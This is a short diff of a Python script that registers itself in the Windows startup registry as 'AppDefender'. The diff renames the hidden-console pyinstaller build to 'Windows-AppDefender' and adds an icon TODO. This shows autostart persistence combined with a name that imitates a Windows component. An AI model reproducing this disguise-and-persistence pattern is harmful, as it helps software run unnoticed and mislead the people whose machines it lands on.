@@ -11,7 +11,9 @@ def add_to_startup():
     winreg.SetValueEx(key, 'AppDefender', 0, winreg.REG_SZ, path)
     winreg.CloseKey(key)
 
-# cmd: pyinstaller script.py --onefile --noconsole --icon defence.ico --name AppDefender
+# cmd: pyinstaller script.py --onefile --noconsole --icon defence.ico --name Windows-AppDefender
+
+# TODO: Make another icon thats blue
 
 add_to_startup()
 
